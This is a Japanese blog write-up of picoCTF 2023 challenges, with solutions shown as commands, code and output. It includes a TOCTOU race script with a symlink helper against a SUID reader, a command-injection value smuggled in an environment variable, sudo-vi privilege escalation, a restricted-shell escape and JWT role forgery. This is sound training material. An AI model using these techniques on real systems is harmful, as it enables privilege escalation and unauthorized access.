---
title: "picoCTF 2023 Writeup"
date: 2023-04-03T15:30:00+09:00
lastmod: 2023-04-03T15:30:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2023%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://picoctf.org/](https://picoctf.org/)
<br /><br />
例年、チャレンジの使いまわしが多かった印象のある picoCTF ですが、今年はチャレンジが全て一新されていたようで、良かったと思います。

<br /><br />
最終結果は、こんな感じ。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_Score1.png" alt="picoctf_2023_Score1.png">


<br />
4900点をとって、最終順位は 389位でした。
<br />
<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_Rank.png" alt="picoctf_2023_Rank.png">


<br /><br />
以下は、チャレンジ一覧です。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_web.png" alt="picoctf_2023_web.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_crypto.png" alt="picoctf_2023_crypto.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_rev.png" alt="picoctf_2023_rev.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_forensics.png" alt="picoctf_2023_forensics.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_general.png" alt="picoctf_2023_general.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_pwn.png" alt="picoctf_2023_pwn.png">

(tic-tacは、解いてます。)




<br /><br /><br />
以下、Writeupです。

## [General Skills]: useless (100 points)
- - -
### Challenge
> There's an interesting script in the user's home directory.
The work computer is running SSH. We've been given a script which performs some basic calculations, explore the script and find a flag.

<br />
### Solution

以下は、ホームディレクトリにあるファイル一覧です。

<pre>
picoplayer@challenge:~$ ls -al
total 16
drwxr-xr-x 1 picoplayer picoplayer   20 Mar 19 01:31 .
drwxr-xr-x 1 root       root         24 Mar 16 02:30 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Mar 19 01:31 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
-rwxr-xr-x 1 root       root        517 Mar 16 01:30 useless

</pre>

<br />

`useless` というファイルは bash script で、中身は以下の通りです。

```sh
#!/bin/bash
# Basic mathematical operations via command-line arguments

if [ $# != 3 ]
then
  echo "Read the code first"
else
	if [[ "$1" == "add" ]]
	then
	  sum=$(( $2 + $3 ))
	  echo "The Sum is: $sum"

	elif [[ "$1" == "sub" ]]
	then
	  sub=$(( $2 - $3 ))
	  echo "The Substract is: $sub"

	elif [[ "$1" == "div" ]]
	then
	  div=$(( $2 / $3 ))
	  echo "The quotient is: $div"

	elif [[ "$1" == "mul" ]]
	then
	  mul=$(( $2 * $3 ))
	  echo "The product is: $mul"

	else
	  echo "Read the manual"

	fi
fi
```

<br />

`"Read the manual"` というメッセージがフラグへ導くヒントで、「マニュアルを見たらそこにフラグがあるよ」というだけのことなのですが、それに気づくまでに結構悩みました。

<pre>
picoplayer@challenge:~$ man useless

useless
     useless, — This is a simple calculator script

SYNOPSIS
     useless, [add sub mul div] number1 number2

DESCRIPTION
     Use the useless, macro to make simple calulations like addition,subtraction, multiplication and division.

Examples
     ./useless add 1 2
       This will add 1 and 2 and return 3

     ./useless mul 2 3
       This will return 6 as a product of 2 and 3

     ./useless div 6 3
       This will return 2 as a quotient of 6 and 3

     ./useless sub 6 5
       This will return 1 as a remainder of substraction of 5 from 6

Authors
     This script was designed and developed by Cylab Africa

     picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_4373}

</pre>

<br />

Flag: `picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_4373}`


<br /><br />
<br /><br />
## [General Skills]: Special (300 points)
- - -
### Challenge
> Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
<br /><br />
Hint: Experiment with different shell syntax

<br />
### Solution

とりあえず、SSHでログインして、どういう動きをするのか確認します。

<pre>
Special$ ls -al
Is pal
sh: 1: Is: not found

Special$ aa
A
sh: 1: A: not found

Special$ oghowegowijegoaihegp
Oghowegowijegoaihegp
sh: 1: Oghowegowijegoaihegp: not found

Special$
Traceback (most recent call last):
  File "/usr/local/Special.py", line 19, in <module>
    elif cmd[0] == '/':
IndexError: string index out of range
Connection to saturn.picoctf.net closed.

</pre>

この時点では、さっぱりわからないです。

<br /><br />

トライ・アンド・エラーで続けて見ていくと、相対パスを使ってコマンドが実行できることがわかりました。

<pre>
Special$ /
Absolutely not paths like that, please!

Special$ ../../bin/ls
../../bin/ls
blargh

Special$ ../../bin/find .
../../bin/find .
.
./blargh
./blargh/flag.txt
./.cache
./.cache/motd.legal-displayed
</pre>

<br /><br />

ということで、以下でフラグが得られます。

<pre>
Special$ ../../bin/cat ./blargh/flag.txt
../../bin/cat ./blargh/flag.txt
picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}
</pre>

<br /><br />

ちなみに、フラグだけではなく、チャレンジプログラムの中身も見れます。

<pre>
Special$ ../../bin/cat /usr/local/Special.py
</pre>

```Python
#!/usr/bin/python3

import os
from spellchecker import SpellChecker



spell = SpellChecker()

while True:
  cmd = input("Special$ ")
  rval = 0

  if cmd == 'exit':
    break
  elif 'sh' in cmd:
    print('Why go back to an inferior shell?')
    continue
  elif cmd[0] == '/':
    print('Absolutely not paths like that, please!')
    continue

  # Spellcheck
  spellcheck_cmd = ''
  for word in cmd.split():
    fixed_word = spell.correction(word)
    if fixed_word is None:
      fixed_word = word
    spellcheck_cmd += fixed_word + ' '

  # Capitalize
  fixed_cmd = list(spellcheck_cmd)
  words = spellcheck_cmd.split()
  first_word = words[0]
  first_letter = first_word[0]
  if ord(first_letter) >= 97 and ord(first_letter) <= 122:
    fixed_cmd[0] = chr(ord(spellcheck_cmd[0]) - 0x20)
  fixed_cmd = ''.join(fixed_cmd)

  try:
    print(fixed_cmd)
    os.system(fixed_cmd)
  except:
    print("Bad command!")
```

<br />

Flag: `picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}`



<br /><br />
<br /><br />
## [General Skills]: Specialer (400 points)
- - -
### Challenge
> Reception of Special has been cool to say the least. That's why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just 'Specialer'. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody's complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.
<br /><br />
Hint: What programs do you have access to?

<br />
### Solution

こちらも、まずはSSHでログインして、どういう動きをするのか確認します。

<pre>
Specialer$ ls
-bash: ls: command not found

Specialer$ ../../bin/ls
-bash: ../../bin/ls: No such file or directory

Specialer$ .
-bash: .: filename argument required
.: usage: . filename [arguments]

Specialer$ . *
-bash: .: abra: is a directory
</pre>

<br />

ドットとアスタリスクを使って、abra というディレクトリがあることがわかりました。

<br /><br />

実際は、abra以外にもディレクトリがあったわけですが、`. *` の結果だと、アルファベット順に一番最初に現れたディレクトリしかわかりません。

総当りで調べるとすると、

`. b*`, `. c*`, `. d*` のように、a以外で始まるディレクトリも順番に見ていく必要があるのと、

`. ac*`, `. ad*`, `. ae*` のように、aで始まるけど、"abra"ではないディレクトリも探さないといけません。

<br /><br />

一個一個、コマンドを打つのは面倒だったので、以下の単純なスクリプトを書きました。

```python
#!/usr/bin/env python
from pwn import *
import string

s=ssh(host='saturn.picoctf.net', port=51877, user='ctf-player', password='483e80d4')

# cmd_base = '. ./'
# cmd_base = '. ./a'
# cmd_base = '. .'
cmd_base = '. ./ala/'

while True:
    found = 0
    chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits + '._-#$&?{}()')
    # chars = list(string.ascii_lowercase + string.digits + '._-')
    for c in chars:
        cmd = cmd_base + c + '*'
        data = repr(s(cmd))
        print(data)
s.close()
```

ベース (cmd_base)を用意しておいて、そこに1つの文字と、`*`をくっつけて、順に実行していくだけのものです。

これにより、ala というディレクトリがあることがわかり、alaの下を調べたら kazam.txt があるのがわかりました。

<br />

手動で、確認してみると、以下のような感じです。

<pre>
Specialer$ . ./a*
-bash: .: ./abra: is a directory

Specialer$ . ./al*
-bash: .: ./ala: is a directory

Specialer$ . ./ala/a*
-bash: ./ala/a*: No such file or directory

Specialer$ . ./ala/k*
-bash: return: too many arguments

Specialer$ ./ala/k*
-bash: ./ala/kazam.txt: Permission denied

Specialer$ . ./ala/kazam.txt
-bash: return: too many arguments
</pre>

<br />

ファイルの中身は、readコマンドで読みました。

<pre>
Specialer$ read -rd '' file < ./ala/kazam.txt ; echo "$file"
return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}

</pre>

<br />

Flag: `picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}`


<br /><br />
<br /><br />
## [General Skills]: permissions (100 points)
- - -
### Challenge
> Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
Can you login and read the root file?
<br /><br />
Hint: What programs do you have access to?

<br />
### Solution
sudo で vi が起動できます。

<pre>
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
</pre>

<br /><br />

ということで、以下でフラグは得られます。

<pre>
sudo /usr/bin/vi /root
</pre>

<br />

あるいは、viからroot accountでshellを起動することもできます。

参考：[GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo)


<br />

Flag: `picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}`




<br /><br />
<br /><br />
## [Binary Exploitation]: hijacking (200 points)
- - -
### Challenge
> Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.
Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.
<br /><br />
Hint1: Check for Hidden files
<br />
Hint2: No place like Home:)

<br />
### Solution

これは、作問ミスなのかな？

おそらく、想定解は /home/picoctf/.server.py の方を使ったものだと思うのですが、`vi`も起動できてしまうので、前述の permissions のチャレンジと全く同じ方法で解けてしまいます。

<pre>
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
</pre>

<br />

Flag: `picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}`



<br /><br />
<br /><br />
## [Binary Exploitation]: babygame01 (100 points)
- - -
### Challenge
> Get the flag and reach the exit.
Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you'll have to figure your way around the map.
<br /><br />
Hint1: Use 'w','a','s','d' to move around.
<br />
Hint2: There may be secret commands to make your life easy.

- game (ELF 32-bit)


<br />
### Solution

Ghidraを使ってデコンパイルしてみます。

{{< highlight c "linenos=table,hl_lines=25 26 28" >}}
undefined4 main(void)

{
  int iVar1;
  undefined4 uVar2;
  int in_GS_OFFSET;
  int local_aac;
  int local_aa8;
  char local_aa4;
  undefined local_aa0 [2700];
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  init_player(&local_aac);
  init_map(local_aa0,&local_aac);
  print_map(local_aa0,&local_aac);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      move_player(&local_aac,(int)(char)iVar1,local_aa0);
      print_map(local_aa0,&local_aac);
    } while (local_aac != 0x1d);
  } while (local_aa8 != 0x59);
  puts("You win!");
  if (local_aa4 != '\0') {
    puts("flage");
    win();
    fflush(stdout);
  }
  uVar2 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar2 = __stack_chk_fail_local();
  }
  return uVar2;
}
{{< / highlight >}}

<br />
Line 25 & 26の `0x1d`と`0x59`のチェックは、単純にプレイヤーのポジションのチェックで、`s`, `d` を使ってプレーヤーをゴールまで移動させたときにループを抜けさせる判定です。

ただし、単純にゴールしただけだと、`local_aa4` の値が書き換わっていないので`win()`関数が呼ばれず、フラグが表示されないまま終了してしまいます。

<br />

以下は、プレーヤーを動かすところの関数です。

上限と下限のチェックがないので、マップの範囲をはみ出すことができ、結果的に `local_aa4` の値を書き換えることができるようです。

```C
void move_player(int *param_1,char param_2,int param_3)

{
  int iVar1;
  
  if (param_2 == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (param_2 == 'p') {
    solve_round(param_3,param_1);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
  if (param_2 == 'w') {
    *param_1 = *param_1 + -1;
  }
  else if (param_2 == 's') {
    *param_1 = *param_1 + 1;
  }
  else if (param_2 == 'a') {
    param_1[1] = param_1[1] + -1;
  }
  else if (param_2 == 'd') {
    param_1[1] = param_1[1] + 1;
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
  return;
}
```

<br />

ちなみに、`l`は、プレーヤーを示すアイコンを変更するもの（おそらく、次の `babygame02` チャレンジで使うやつ）で、

`p`は、一気にゴールまで行ってくれる隠しコマンドです。


<br /><br />

ぶっちゃけトライ・アンド・エラーで解いたんですが、

まず、`w`を4回、次に、`a`を8回やると、フラグが取れる状態になるみたいです。

<pre>
End tile position: 29 89
Player has flag: 64
</pre>

<br />

この状態で、`p`をすると、フラグが得られます。

<pre>
.........................................................................................@
You win!
flage
picoCTF{gamer_m0d3_enabled_2bcdc8e6}
</pre>

<br />

Flag: `picoCTF{gamer_m0d3_enabled_2bcdc8e6}`


<br /><br />
<br /><br />
## [Binary Exploitation]: tic-tac (200 points)
- - -
### Challenge
> Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
<br /><br />
ssh to saturn.picoctf.net:56072, and run the binary named "txtreader" once connected. Login as ctf-player with the password, 483e80d4

<br />
### Solution
以下が、ホームディレクトリのファイル一覧です。

<pre>
ctf-player@pico-chall$ ls -al
total 32
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 21 10:13 .
drwxr-xr-x 1 root       root          24 Mar 16 02:27 ..
drwx------ 2 ctf-player ctf-player    34 Mar 21 10:13 .cache
-rw-r--r-- 1 root       root          67 Mar 16 02:28 .profile
-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp
-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader
</pre>

<br />

src.cpp は、実行ファイル `txtreader` のソースコードだと想定でき、中身は以下の通りです。

```c
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

<br />

`txtreader` には、見ての通り SUID ビットが立っており、これを使って /home/ctf-player/flag.txt を読み込むチャレンジなのですが、flag.txtのオーナーはrootであるために、中身が見れません。

以下、実行結果。

<pre>
ctf-player@pico-chall$ ./txtreader flag.txt
Error: you don't own this file

</pre>


<br /><br />

チャレンジタイトル `tic-tac` からも想像つきますし、"getuid bypass" 辺りをキーワードにググってもわかるのですが、これは [TOCTOU](https://en.m.wikipedia.org/wiki/Time-of-check_to_time-of-use) (Time of check to time of use) を使って解くチャレンジです。

<br />

以下の2つのファイルを用意します。

なお、これらのコードのサンプルは、TOCTOUを調べていると見つかります。

- exploit.sh (echoしている文字列は、何でもいいです)
```sh
#!/bin/sh
while true
do
    rm temp;
    echo "This is a file that the user can overwrite" > temp
    echo "TOCTOU-Attack-test" | ./txtreader temp & ./symbolic-link temp
done
```

<br />

- symbolic-link.c
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char * argv[])
{
    unlink(argv[1]);
    symlink("./flag.txt", argv[1]);
}
```

<br />

これらのファイルをscpで転送しておき、symbolic-link.c は gcc でコンパイルしておきます。

<br />

その後、exploit.shを実行すると、タイミングによってはフラグの中身が表示されることがあります。

<pre>
ctf-player@pico-chall$ /bin/bash ./exploit.sh
This is a file that the user can overwrite
This is a file that the user can overwrite
:
(snip)
:
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_007659c9}
Error: you don't own this file
Error: you don't own this file
</pre>

<br />

Flag: `picoCTF{ToctoU_!s_3a5y_007659c9}`



<br /><br />
<br /><br />
## [Binary Exploitation]: VNE (200 points)
- - -
### Challenge
> We've got a binary that can list directories as root, try it out !!
ssh to saturn.picoctf.net:62449, and run the binary named "bin" once connected. Login as ctf-player with the password, 8a707622
<br /><br />
Hint1: Have you checked the content of the /root folder
<br />
Hint2: Find a way to add more instructions to the ls

<br />
### Solution

ホームディレクトリに、`bin` という名前のelfファイルが置かれています。

<pre>
ctf-player@pico-chall$ ls -al
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Mar 21 11:24 .
drwxr-xr-x 1 root       root          24 Mar 16 01:59 ..
drwx------ 2 ctf-player ctf-player    34 Mar 21 11:24 .cache
-rw-r--r-- 1 root       root          67 Mar 16 01:59 .profile
-rwsr-xr-x 1 root       root       18752 Mar 16 01:59 bin

ctf-player@pico-chall$ file bin
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped
</pre>

<br />

実行してみます。

<pre>
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set

ctf-player@pico-chall$ export SECRET_DIR="/root"

ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
flag.txt

</pre>

<br />

`strings` コマンドを実行してみると `system()`関数を呼んでいたりするのがわかるのと、Hint2も加味すると、Command Injectionっぽいのが何となくわかりますね。

<br />

<pre>
ctf-player@pico-chall$ export SECRET_DIR="/root; cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of /root; cat /root/flag.txt as root:
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_3f693329}
</pre>

<br />

Flag: `picoCTF{Power_t0_man!pul4t3_3nv_3f693329}`


<br /><br />
<br /><br />
## [Reverse Engineering]: Ready Gladiator 0 (100 points)
- - -
### Challenge
> Can you make a CoreWars warrior that always loses, no ties?
Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
<br /><br />
Hint1: CoreWars is a well-established game with a lot of docs and strategy
<br />
Hint2: Experiment with input to the CoreWars handler or create a self-defeating bot

- imp.red

中身：

<pre>
;redcode
;name Imp Ex
;assert 1
mov 0, 1
end
</pre>


<br />
### Solution

多少マニュアルとかは読んだのですが、あんまりよくわからずに解きました。

とりあえず、`mov 0, 0`で 動かないようにしたら、常に負けるようになり、フラグが得られます。

<pre>
;redcode
;name Imp Ex
;assert 1
mov 0, 0
end
</pre>

<br />

実行結果：

<pre>
$ nc saturn.picoctf.net 56861 < imp.red
;redcode
;name Imp Ex
;assert 1
mov 0, 0
end
Submit your warrior: (enter 'end' when done)

Warrior1:
;redcode
;name Imp Ex
;assert 1
mov 0, 0
end

Rounds: 100
Warrior 1 wins: 0
Warrior 2 wins: 100
Ties: 0
You did it!
picoCTF{h3r0_t0_z3r0_4m1r1gh7_e476d4cf}

</pre>

<br />

Flag: `picoCTF{h3r0_t0_z3r0_4m1r1gh7_e476d4cf}`



<br /><br />
<br /><br />
## [Reverse Engineering]: Ready Gladiator 1 (200 points)
- - -
### Challenge
> Can you make a CoreWars warrior that wins?
Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
nc saturn.picoctf.net 59752 < imp.red
To get the flag, you must beat the Imp at least once out of the many rounds.
<br /><br />
Hint: You may be able to find a viable warrior in beginner docs

<br />
### Solution

参考にしたサイト：[https://vyznev.net/corewar/guide.html](https://vyznev.net/corewar/guide.html)

とりあえず、The Dwarf でやってみました。

<pre>
$ nc saturn.picoctf.net 59752 < test.red
;redcode
;name Imp Ex
;assert 1
        ADD #4, 3        ; execution begins here
        MOV 2, @2
        JMP -2
        DAT #0, #0
end
Submit your warrior: (enter 'end' when done)

Warrior1:
;redcode
;name Imp Ex
;assert 1
        ADD #4, 3        ; execution begins here
        MOV 2, @2
        JMP -2
        DAT #0, #0
end

Rounds: 100
Warrior 1 wins: 23
Warrior 2 wins: 0
Ties: 77
You did it!
picoCTF{1mp_1n_7h3_cr055h41r5_ec57a42e}

</pre>

<br />

Flag: `picoCTF{1mp_1n_7h3_cr055h41r5_ec57a42e}`



<br /><br />
<br /><br />
## [Reverse Engineering]: Ready Gladiator 2 (400 points)
- - -
### Challenge
> Can you make a CoreWars warrior that wins every single round?
Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
nc saturn.picoctf.net 49743 < imp.red
To get the flag, you must beat the Imp all 100 rounds.
<br /><br />
Hint: If your warrior is close, try again, it may work on subsequent tries... why is that?

<br />
### Solution

`corewars against imp` をキーワードにググったところ、Redditで、このチャレンジの答えをもらっている人がいたんですよね。

こんな風に問題を解かれてしまうと、運営側も悩ましいですね。。。

<pre>
$ nc saturn.picoctf.net 49743 < test2.red
;redcode-94
;name Dwarf
;author A.K. Dewdney
;strategy Bombs the core at regular intervals.
;(slightly modified by Ilmari Karonen)
;assert CORESIZE % 4 == 0
JMP 0, <-5
end
Submit your warrior: (enter 'end' when done)

Warrior1:
;redcode-94
;name Dwarf
;author A.K. Dewdney
;strategy Bombs the core at regular intervals.
;(slightly modified by Ilmari Karonen)
;assert CORESIZE % 4 == 0
JMP 0, <-5
end

Rounds: 100
Warrior 1 wins: 100
Warrior 2 wins: 0
Ties: 0
You did it!
picoCTF{d3m0n_3xpung3r_fc41524e}

</pre>

<br />

Flag: `picoCTF{d3m0n_3xpung3r_fc41524e}`


<br /><br />
<br /><br />
## [Reverse Engineering]: timer (100 points)
- - -
### Challenge
> You will find the flag after analysing this apk
<br /><br />
Hint1: Decompile
<br />
Hint2: mobsf or jadx

- timer.apk

<br />
### Solution

他の2つのRevチャレンジ `Reverse` (100 points)、`Safe Opener 2` (100 points) は strings コマンドで解けるわけですが、これもほぼ同様でデコンパイルしなくても解けちゃいます。

apkファイルはzipファイルなので、まずはzip解凍します。

そうすると、classes3.dex というファイルがあるので、strings コマンドを実行します。

<pre>
$ strings classes3.dex | grep pico
*picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}
</pre>

<br />

Flag: `picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}`



<br /><br />
<br /><br />
## [Cryptography]: ReadMyCert (100 points)
- - -
### Challenge
> How about we take you on an adventure on exploring certificate signing requests
Take a look at this CSR file here.
<br /><br />
Hint: Download the certificate signing request and try to read it.

- readmycert.csr

<br />
### Solution

CNにフラグがセットされていました。

<pre>
$ openssl req -text -in readmycert.csr
Certificate Request:
    Data:
        Version: 0 (0x0)
        Subject: CN=picoCTF{read_mycert_373b4ab0}/name=ctfPlayer
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
:
(snip)
:
</pre>

<br />

Flag: `picoCTF{read_mycert_373b4ab0}`




<br /><br />
<br /><br />
## [Web]: Java Code Analysis!?! (300 points)
- - -
### Challenge
> BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Here are the credentials to get you started:
Username: "user"
Password: "user"
Source code can be downloaded here.
Website can be accessed here!.
<br /><br />
Hint1: Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
<br />
Hint2: The 'role' and 'userId' fields in the JWT can be of interest to you!
<br />
Hint3: The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
<br />
Hint4: Upgrade your 'role' with the new (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.

<br />
### Solution

以下のファイルの中で、JWTのsecretを設定しているところが見つかります。

- bookshelf-pico/src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java

```java
:
(snip)
:
class SecretGenerator {
    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);
    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

    @Autowired
    private UserDataPaths userDataPaths;

    private String generateRandomString(int len) {
        // not so random
        return "1234";
    }
:
(snip)
:
```

<br />

server_secret.txt はzipファイルの中には存在していないですし、Hint1も加味すると、`1234`がsecretっぽいのがわかります。

JWTを使ったCTFチャレンジで、secretがわかるのであれば、もう解けたも同然です。

<br />

Burpでやりとりを見ていたたら、以下のpayloadが見つかりました。
<pre>
{"type":"SUCCESS","payload":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDM0MDk0MCwiaWF0IjoxNjc5NzM2MTQwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.Gf0Ow6yh3CXQdlng2uk9FGIXQsEHrJ8O-djA7g-yd8I"}
</pre>

<br />

これを、[https://jwt.io/](https://jwt.io/) を使って、編集します。

変更前：

<pre>
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1680340940,
  "iat": 1679736140,
  "userId": 1,
  "email": "user"
}
</pre>


<br />

変更後： (roleとuserIDを変えました)

<pre>
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1680340940,
  "iat": 1679736140,
  "userId": 0,
  "email": "user"
}
</pre>

<br />

変更後のpayloadは、FireFoxのdeveloper toolで設定しました。
Local Storageの中に出てくる auth-token と token-payload です。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_javacode1.png" alt="picoctf_2023_javacode1.png">


<br />

これで Admin にはなれるのですが、フラグは表示されませんでした。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_javacode2.png" alt="picoctf_2023_javacode2.png">


<br />

なので、Admin dashboardから、userのroleをAdminにして、userでログインしなおしてフラグをゲットしました。

<img src="https://captureamerica.github.io/writeups/img/picoctf_2023_javacode3.png" alt="picoctf_2023_javacode3.png">


<br />

Flag: `picoCTF{w34k_jwt_n0t_g00d_7745dc02}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

